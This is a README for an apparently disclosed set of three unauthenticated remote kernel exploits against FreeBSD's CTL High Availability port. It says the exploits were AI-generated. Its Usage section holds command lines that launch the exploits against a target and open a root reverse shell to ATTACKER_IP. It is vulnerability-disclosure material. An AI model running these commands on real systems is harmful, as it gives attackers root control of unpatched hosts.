# FreeBSD CTL HA: three unauthenticated remote kernel RCEs

Three pre-auth remote kernel vulnerabilities in FreeBSD's CAM Target Layer (CTL) High Availability interconnect. Each one, on its own, gives a remote `uid=0` shell on a stock FreeBSD 14.4-RELEASE amd64 GENERIC kernel from network access to the HA port (TCP 999) alone.

FreeBSD is documenting these rather than patching the code. See [`blog.md`](blog.md) for the full context and the FreeBSD manpage change ([commit `3c8f8432`](https://cgit.freebsd.org/src/commit/?id=3c8f8432b6f653128016c6aaf826e1efb7ee1cec)).

## The bugs

| Name | Bug | Primitive | Writeup | Exploit |
|------|-----|-----------|---------|---------|
| **FreeBSD-One** | DATA channel wire-pointer deref (`ctl_ha.c`) | Arbitrary kernel read/write off the wire | [WRITEUP_FreeBSD-One.md](WRITEUP_FreeBSD-One.md) | [`freebsd-one-exploit.py`](freebsd-one-exploit.py) |
| **FreeBSD-Two** | DATAMOVE `original_sc` wire pointer (`ctl.c:1560`) | Write-only pointer with collateral, bootstrapped to a clean write | [WRITEUP_FreeBSD-Two.md](WRITEUP_FreeBSD-Two.md) | [`freebsd-two-exploit.py`](freebsd-two-exploit.py) |
| **FreeBSD-Three** | SGL heap overflow in DATAMOVE copy loop (`ctl.c:1609`) | Heap overflow into an adjacent UMA slab object, ROP to shellcode | [WRITEUP_FreeBSD-Three.md](WRITEUP_FreeBSD-Three.md) | [`freebsd-three-exploit.py`](freebsd-three-exploit.py) |

All three end the same way: shellcode that calls `kproc_create` + `kern_execve` to spawn `/bin/sh` and connect a root shell back to the attacker, leaving the target running.

## Contents

- **[`blog.md`](blog.md)** — the writeup for the MAD Bugs series, with the original March audit prompt.
- **[`WRITEUP_FreeBSD-One.md`](WRITEUP_FreeBSD-One.md)** — FreeBSD-One deep dive (arbitrary kernel R/W).
- **[`WRITEUP_FreeBSD-Two.md`](WRITEUP_FreeBSD-Two.md)** — FreeBSD-Two deep dive (DATAMOVE write-only pointer).
- **[`WRITEUP_FreeBSD-Three.md`](WRITEUP_FreeBSD-Three.md)** — FreeBSD-Three deep dive (SGL heap overflow).
- **[`freebsd-one-exploit.py`](freebsd-one-exploit.py)** — FreeBSD-One exploit.
- **[`freebsd-two-exploit.py`](freebsd-two-exploit.py)** — FreeBSD-Two exploit.
- **[`freebsd-three-exploit.py`](freebsd-three-exploit.py)** — FreeBSD-Three exploit.

Each writeup also records the exact user prompts that drove the work.

## Target and prerequisites

- FreeBSD 14.4-RELEASE amd64 GENERIC kernel, no KASLR.
- CTL HA enabled: `kern.cam.ctl.ha_mode=2` and a listening `kern.cam.ctl.ha_peer` (TCP 999).
- FreeBSD-Three additionally needs at least one configured LUN (`ctladm create -b ramdisk -s 1048576`) and a single-CPU target for deterministic UMA layout.

## Usage

```bash
python3 freebsd-one-exploit.py   TARGET_IP -p 999 -l ATTACKER_IP -lp 4444
python3 freebsd-two-exploit.py   TARGET_IP -p 999 -l ATTACKER_IP -lp 4444
CALLBACK_IP=ATTACKER_IP CALLBACK_PORT=4444 python3 freebsd-three-exploit.py
```

See each writeup for the full options.

## Provenance

The exploits and writeups were produced by AI (Claude Code on Opus 4.6, March 2026) and verified by us. The text is kept as-is, as a record of what AI vulnerability research looked like in early 2026.
